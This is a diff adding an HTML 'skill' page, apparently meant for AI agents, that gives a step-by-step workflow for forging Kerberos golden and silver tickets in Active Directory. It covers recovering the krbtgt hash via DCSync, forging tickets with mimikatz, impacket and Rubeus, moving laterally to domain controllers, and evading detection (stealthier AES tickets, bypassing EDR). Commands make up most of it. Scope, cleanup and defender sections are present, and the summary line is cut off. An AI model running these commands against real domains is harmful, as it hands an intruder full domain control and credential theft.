@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: golden-ticket</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>golden-ticket</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when forging Kerberos tickets on an authorized Active</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>mimikatz</td><td>2.2.0</td></tr><tr><td>impacket</td><td>0.12.0</td></tr><tr><td>Rubeus</td><td>2.x</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>A golden ticket is a forged Kerberos ticket granting ticket (TGT). It is signed with the krbtgt account&#x27;s hash, so the domain controller trusts it completely, and it can carry any username, any group memberships (including Domain Admins), and a lifetime of years. Forging one requires the krbtgt hash, which means you already hold Domain Admin equivalent rights, usually through DCSync. This skill covers the full authorized workflow for Active Directory assessments, lab environments, and CTFs only: recovering the krbtgt hash, forging the ticket with mimikatz, ticketer, or Rubeus, using it for lateral movement, and the silver ticket variant for single service access.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you hold DCSync rights or Domain Admin equivalent access on</li>
+<p>the target domain.</p>
+<li>Extract the krbtgt NTLM hash (and AES keys if you want AES tickets)</li>
+<p>with secretsdump.py.</p>
+<li>Get the domain SID with lookupsid.py or PowerView.</li>
+<li>Forge the golden ticket with mimikatz, ticketer.py, or Rubeus, choosing</li>
+<p>username, groups, and lifetime deliberately.</p>
+<li>Inject the ticket into your session (/ptt on Windows, KRB5CCNAME on</li>
+<p>Linux).</p>
+<li>Use the ticket for Kerberos authenticated access: SMB, WinRM, LDAP.</li>
+<li>Keep the forged identity consistent and minimal to avoid standing out.</li>
+<li>Record the forged user, groups, lifetime, and every system accessed</li>
+<p>for the report and for cleanup.</p>
+</ol>
+<h2>1. Recover the krbtgt hash</h2>
+<p>The krbtgt hash is the signing key for every TGT in the domain. Pull it with a targeted DCSync that touches only this account.</p>
+<pre><code class="language-bash"># Targeted DCSync of the krbtgt account only (needs replication rights)
+secretsdump.py &#x27;corp.local/administrator:Password1@10.10.10.10&#x27; \
+  -just-dc-user krbtgt
+
+# Same, saving all output to files for the engagement record
+secretsdump.py &#x27;corp.local/administrator:Password1@10.10.10.10&#x27; \
+  -just-dc-user krbtgt -outputfile loot/krbtgt</code></pre>
+<p>The output shows the NTLM hash and, on modern domains, the AES keys:</p>
+<pre><code class="language-text">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</code></pre>
+<p>Copy the NTLM hash after the second colon. If you want AES tickets instead of RC4, note the aes256 key from the same output.</p>
+<h2>2. Get the domain SID</h2>
+<p>The ticket must carry the real domain SID, or the DC will reject it.</p>
+<pre><code class="language-bash"># Domain SID from lookupsid.py
+lookupsid.py &#x27;corp.local/administrator:Password1@10.10.10.10&#x27; | grep -m1 &#x27;Domain SID&#x27;</code></pre>
+<pre><code class="language-powershell"># Same from PowerView on a Windows host
+Get-DomainSID</code></pre>
+<p>You need a value like <code>S-1-5-21-1111111111-2222222222-3333333333</code>. Keep it with the krbtgt hash in your notes, since every forgery needs both.</p>
+<h2>3. Forge the golden ticket</h2>
+<p>Mimikatz on Windows is the classic route. The <code>/ptt</code> flag injects the ticket into the current session immediately.</p>
+<pre><code class="language-text">privilege::debug
+kerberos::golden /user:ghostadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:&lt;krbtgt_nt_hash&gt; /id:500 /groups:512,513,518,519,520 /ptt</code></pre>
+<p>Notes on the flags: <code>/user</code> is the forged username (it does not need to exist), <code>/id:500</code> makes it the built in Administrator RID, and the group RIDs 512 (Domain Admins), 513 (Domain Users), 518 (Schema Admins), 519 (Enterprise Admins), 520 (Group Policy Creator Owners) give full rights. Set a bounded lifetime with <code>/endin:600</code> (minutes) instead of the default ten years, unless the test plan calls for persistence.</p>
+<p>From Linux, ticketer.py writes a ccache file you can use with any impacket tool:</p>
+<pre><code class="language-bash"># Forge with the RC4 (NTLM) hash
+ticketer.py -nthash &lt;krbtgt_nt_hash&gt; \
+  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
+  -domain corp.local ghostadmin
+
+# Forge with the AES256 key instead (stealthier, no RC4 downgrade)
+ticketer.py -aesKey &lt;krbtgt_aes256_key&gt; \
+  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
+  -domain corp.local ghostadmin
+
+# Point impacket tools at the forged ticket
+export KRB5CCNAME=./ghostadmin.ccache
+klist</code></pre>
+<p>Rubeus covers the same ground from a Windows host without mimikatz:</p>
+<pre><code class="language-powershell"># Forge and inject in one step
+Rubeus.exe golden /krbtgt:&lt;krbtgt_nt_hash&gt; /user:ghostadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /ptt</code></pre>
+<h2>4. Use the forged ticket</h2>
+<p>With the ticket injected, authenticate over Kerberos without any password. Impacket tools take <code>-k -no-pass</code> to use the ccache.</p>
+<pre><code class="language-bash"># SMB access as the forged Domain Admin
+export KRB5CCNAME=./ghostadmin.ccache
+psexec.py -k -no-pass &#x27;corp.local/ghostadmin@dc01.corp.local&#x27;
+
+# Dump hashes from another DC with the same ticket
+secretsdump.py -k -no-pass &#x27;corp.local/ghostadmin@dc02.corp.local&#x27; -just-dc-user administrator
+
+# WinRM command execution
+evil-winrm -i 10.10.10.10 2&gt;/dev/null; wmiexec.py -k -no-pass &#x27;corp.local/ghostadmin@dc01.corp.local&#x27;</code></pre>
+<p>On Windows with the ticket in the session, normal tools just work:</p>
+<pre><code class="language-powershell"># Verify the forged identity is active
+klist
+# Access a protected share
+dir \\dc01.corp.local\c$</code></pre>
+<h2>5. Silver ticket variant</h2>
+<p>A silver ticket forges a service ticket for one specific service instead of a domain wide TGT. It needs the service account&#x27;s hash (for example a machine account hash), which you may already have from a DCSync or local SAM dump. It is quieter because the DC is never contacted.</p>
+<pre><code class="language-bash"># Forge a CIFS silver ticket for one file server (needs the machine account hash)
+ticketer.py -nthash &lt;machine_nt_hash&gt; \
+  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
+  -domain corp.local -spn cifs/fileserver.corp.local ghostadmin
+export KRB5CCNAME=./ghostadmin.ccache
+smbclient.py -k -no-pass &#x27;corp.local/ghostadmin@fileserver.corp.local&#x27;</code></pre>
+<pre><code class="language-powershell"># Rubeus silver ticket for the same service
+Rubeus.exe silver /service:cifs/fileserver.corp.local /rc4:&lt;machine_nt_hash&gt; /user:ghostadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /ptt</code></pre>
+<p>Use silver tickets when you only need one service and want to avoid the noise of a domain wide golden ticket. The trade off is scope: a silver ticket for CIFS cannot be used for LDAP or WinRM.</p>
+<h2>6. Stay in scope and clean up</h2>
+<p>A golden ticket is full domain compromise in a file. On an authorized test, keep the forged identity boring: a plausible username, membership only in the groups the test needs, and the shortest lifetime that covers the work. Never copy the ticket or the krbtgt hash outside the engagement systems. At the end of the test, delete the ccache files and ticket files from every machine you touched, and tell the client the krbtgt account must be reset twice to invalidate any forged tickets, since a single reset leaves the previous hash valid for replication.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Ticket rejected with KRB_AP_ERR_MODIFIED: the domain SID or krbtgt</li>
+<p>hash is wrong. Re pull both and compare character by character.</p>
+<li>Clock skew over five minutes breaks Kerberos. Sync the attack box to</li>
+<p>the DC before forging or using tickets.</p>
+<li>RC4 tickets get flagged or downgraded on hardened domains. Use the</li>
+<p>AES256 key with ticketer.py <code>-aesKey</code> or Rubeus <code>/aes256</code> instead.</p>
+<li>The forged user cannot access a resource despite Domain Admin groups:</li>
+<p>some services check the PAC against the real directory. Add a real group membership or use a username that exists.</p>
+<li>mimikatz <code>kerberos::golden</code> fails without <code>privilege::debug</code> first.</li>
+<p>Run it as administrator with SeDebugPrivilege.</p>
+<li>KRB5CCNAME not picked up: export it in the same shell that runs the</li>
+<p>impacket tool, and confirm with <code>klist</code> that the ticket is listed.</p>
+<li>Ticket lifetime too long looks anomalous in logs. Use <code>/endin</code> in</li>
+<p>mimikatz or ticketer&#x27;s default shorter lifetime unless persistence is in scope.</p>
+<li>Cross domain forests need the trust key, not the krbtgt hash, for the</li>
+<p>trusting domain. Forge against the domain whose krbtgt you actually hold, then cross the trust normally.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No krbtgt hash yet: get DCSync rights first (see the dcsync skill),</li>
+<p>since golden ticket forging starts where DCSync ends.</p>
+<li>DCSync is blocked but you have a DC backup or ntds.dit: extract the</li>
+<p>krbtgt hash offline from the database file instead.</p>
+<li>You only have a service account hash: forge a silver ticket for that</li>
+<p>service rather than a golden ticket.</p>
+<li>The domain uses AES only and you only pulled the NTLM hash: re-run</li>
+<p>secretsdump and take the aes256 key from the same output.</p>
+<li>Need persistence that survives a krbtgt reset: that is outside normal</li>
+<p>test scope. Document the finding and let the client drive remediation instead of planting deeper persistence.</p>
+<li>Rubeus and mimikatz both blocked by EDR: ticketer.py from Linux</li>
+<p>leaves no Windows process at all.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders hunt golden tickets in Event ID 4769 (Kerberos service ticket requested) with ticket lifetimes far above the normal ten hours, TGTs used from hosts the user never touches, and RC4 encrypted tickets on domains that should be AES only. Microsoft Defender for Identity raises a dedicated suspected golden ticket alert on lifetime and encryption anomalies. The durable fixes are: protect the krbtgt hash like the keys to the kingdom (it is), reset the krbtgt account password twice after any suspected compromise, enforce AES for Kerberos, and alert on 4769 events with unusual lifetimes or encryption types. A double krbtgt reset is the only reliable way to kill existing forgeries, and it must be done with replication time between the two resets.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1558.001 (Steal or Forge Kerberos Tickets: Golden</li>
+<p>Ticket).</p>
+<li>MITRE ATT&amp;CK T1558.002 (Steal or Forge Kerberos Tickets: Silver</li>
+<p>Ticket).</p>
+<li>mimikatz kerberos::golden documentation:</li>
+<p>https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</p>
+<li>Impacket ticketer.py documentation:</li>
+<p>https://github.com/fortra/impacket/tree/master/examples</p>
+<li>Rubeus documentation:</li>
+<p>https://github.com/GhostPack/Rubeus</p>
+<li>Microsoft guidance on resetting the krbtgt account password.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
